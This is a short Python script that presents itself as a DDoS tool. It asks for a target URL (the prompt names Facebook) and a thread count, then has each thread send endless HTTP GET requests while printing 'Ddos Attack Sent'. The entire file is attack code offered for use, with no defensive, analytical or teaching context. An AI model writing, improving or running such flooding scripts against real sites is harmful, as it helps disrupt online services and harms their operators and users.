import random
import requests
import threading
def send_request(url):
    try:
        while True:
            response = requests.get(url)
            print("\x1b[1;91mDdos Attack Sent💀")
    except:
        pass

def start_ddos(url, num_threads):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url,))
        threads.append(t)
        t.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    facebook_url = input("Enter the facebooke URL: ")
    num_threads = int(input("Enter the number of Attack : "))

    start_ddos(facebook_url, num_threads)